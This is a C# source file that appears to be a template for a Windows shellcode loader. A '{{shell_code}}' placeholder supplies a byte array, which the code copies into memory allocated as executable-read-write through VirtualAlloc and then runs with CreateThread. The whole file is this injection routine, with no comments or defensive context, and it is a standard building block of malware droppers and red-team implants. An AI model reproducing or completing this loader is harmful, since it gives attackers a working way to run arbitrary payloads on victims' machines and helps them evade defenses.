using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;
    const uint INFINITE = 0xFFFFFFFF;

    static void Main()
    {
        {{shell_code}}

        IntPtr execMem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        Marshal.Copy(buf, 0, execMem, buf.Length);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, execMem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, INFINITE);

        VirtualFree(execMem, 0, MEM_RELEASE);
    }
}